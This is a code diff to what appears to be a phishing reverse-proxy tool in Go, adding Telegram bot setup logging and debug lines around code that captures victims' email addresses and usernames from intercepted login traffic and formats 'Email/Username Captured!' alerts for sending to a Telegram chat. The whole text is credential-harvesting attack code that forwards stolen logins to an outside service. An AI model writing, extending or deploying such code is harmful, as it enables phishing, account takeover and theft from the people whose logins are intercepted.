@@ -108,6 +108,11 @@ func SetJSONVariable(body []byte, key string, value interface{}) ([]byte, error)
 }
 
 func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool) (*HttpProxy, error) {
+	if botToken == "" || chatID == "" {
+        log.Warning("[Telegram] Bot token or chat ID not provided")
+    } else {
+        log.Info("[Telegram] Initializing with bot token: %s... and chat ID: %s", botToken[:10], chatID)
+    }
 	p := &HttpProxy{
 		Proxy:             goproxy.NewProxyHttpServer(),
 		Server:            nil,
@@ -694,6 +699,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								um := pl.username.search.FindStringSubmatch(string(body))
 								if um != nil && len(um) > 1 {
 									p.setSessionUsername(ps.SessionId, um[1])
+									log.Info("[Debug] About to log username: %s", um[1])
 									log.Success("[%d] A Username: [%s]", ps.Index, um[1])
 									message := fmt.Sprintf(`📧 <b>Email/Username Captured!</b>
 									✉️ <b>Email/Username:</b> %s
@@ -789,6 +795,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										um := pl.username.search.FindStringSubmatch(v[0])
 										if um != nil && len(um) > 1 {
 											p.setSessionUsername(ps.SessionId, um[1])
+											log.Info("[Debug] About to log username: %s", um[1])
 											log.Success("[%d] A Username: [%s]", ps.Index, um[1])
 											message := fmt.Sprintf(`📧 <b>Email/Username Captured!</b>
 											✉️ <b>Email/Username:</b> %s
